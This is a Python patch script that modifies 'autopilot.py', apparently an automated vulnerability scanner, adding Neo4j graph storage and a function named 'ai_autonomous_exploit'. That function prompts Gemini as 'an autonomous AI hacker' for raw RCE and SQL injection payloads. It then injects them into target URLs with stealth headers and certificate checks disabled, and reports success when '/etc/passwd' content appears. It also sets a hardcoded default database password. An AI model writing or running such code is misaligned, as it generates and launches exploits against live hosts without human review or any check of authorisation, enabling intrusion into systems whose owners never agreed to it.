import json

with open("autopilot.py", "r", encoding="utf-8") as f:
    content = f.read()

# 1. Add Neo4j env vars
env_vars_block = """
INTERACTSH_URL = ENV_VARS.get("INTERACTSH_URL", "")
"""
new_env_vars_block = """
INTERACTSH_URL = ENV_VARS.get("INTERACTSH_URL", "")
NEO4J_URI = ENV_VARS.get("NEO4J_URI", "bolt://localhost:7687")
NEO4J_USER = ENV_VARS.get("NEO4J_USER", "neo4j")
NEO4J_PASSWORD = ENV_VARS.get("NEO4J_PASSWORD", "password123")
"""
content = content.replace(env_vars_block.strip(), new_env_vars_block.strip())

# 2. Add AI Autonomous Hacker and Neo4j functions
ai_neo4j_code = """
def push_to_graph(finding):
    try:
        from neo4j import GraphDatabase
        driver = GraphDatabase.driver(NEO4J_URI, auth=(NEO4J_USER, NEO4J_PASSWORD))
        
        program = finding.get('program', 'unknown')
        url = finding.get('url', '')
        v_type = finding.get('type', 'unknown')
        severity = finding.get('severity', 'LOW')
        
        domain = urlparse(url).hostname if url else "unknown"
        
        query = '''
        MERGE (p:Program {name: $program})
        MERGE (d:Domain {name: $domain})
        MERGE (v:Vulnerability {type: $v_type, url: $url, severity: $severity})
        MERGE (p)-[:OWNS]->(d)
        MERGE (d)-[:HAS_VULN]->(v)
        '''
        with driver.session() as session:
            session.run(query, program=program, domain=domain, v_type=v_type, url=url, severity=severity)
        driver.close()
    except Exception as e: pass

def ai_autonomous_exploit(url):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return None
    log(f"[*] Autonomous AI analyzing {url} for custom exploits...")
    prompt = f"You are an autonomous AI hacker. Analyze this URL: {url}. Provide exactly 3 highly advanced, context-specific payload strings (separated by newlines) to inject into its parameters for RCE or advanced SQLi. Do not include any explanations, just the raw payloads."
    api_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    findings = []
    try:
        r = requests.post(api_url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        payloads = r.json()['candidates'][0]['content']['parts'][0]['text'].strip().split('\\n')
        
        for p in payloads:
            p = p.strip().strip('"').strip("'")
            if not p: continue
            
            # AI executes the exploit
            headers = get_stealth_headers()
            test_url = f"{url}?id={requests.utils.quote(p)}&q={requests.utils.quote(p)}"
            resp = requests.get(test_url, headers=headers, timeout=5, verify=False)
            
            if "root:x:0:0" in resp.text or "syntax error" in resp.text.lower():
                findings.append({
                    "type": "AI_AUTONOMOUS_EXPLOIT_SUCCESS",
                    "url": test_url,
                    "severity": "CRITICAL",
                    "detail": f"AI Successfully exploited endpoint using custom payload: {p[:30]}..."
                })
    except: pass
    return findings if findings else None
"""

content = content.replace('def create_notion_ticket(finding):', ai_neo4j_code.strip() + '\n\ndef create_notion_ticket(finding):')

# 3. Inject AI Exploit in Engine
content = content.replace('tasks.append(executor.submit(check_headless_spa, b))', 'tasks.append(executor.submit(check_headless_spa, b))\n            tasks.append(executor.submit(ai_autonomous_exploit, b))')

# 4. Inject Neo4j push in main loop
content = content.replace('create_notion_ticket(f)', 'create_notion_ticket(f)\n            push_to_graph(f)')

with open("autopilot.py", "w", encoding="utf-8") as f:
    f.write(content)
